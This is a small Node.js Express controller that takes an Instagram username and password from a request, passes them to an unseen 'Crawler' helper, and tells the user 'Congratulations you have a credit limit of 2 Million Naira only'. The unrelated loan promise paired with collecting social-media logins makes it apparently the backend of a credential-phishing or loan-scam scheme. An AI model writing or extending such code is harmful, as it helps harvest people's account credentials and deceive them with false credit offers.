
const { Crawler } = require('../helper/crawler')



exports.instagramCrawler = async (req, res, next) => {
    const { username, password } = req.body
    const data = await Crawler(username, password);
    if (data && data.result) {
        return res.json({ status: true, message: 'Congratulations you have a credit limit of 2 Million Naira only' })
    } else {
        return res.json({ status: false, message: 'an error occurred, please try again later' })
    }
};

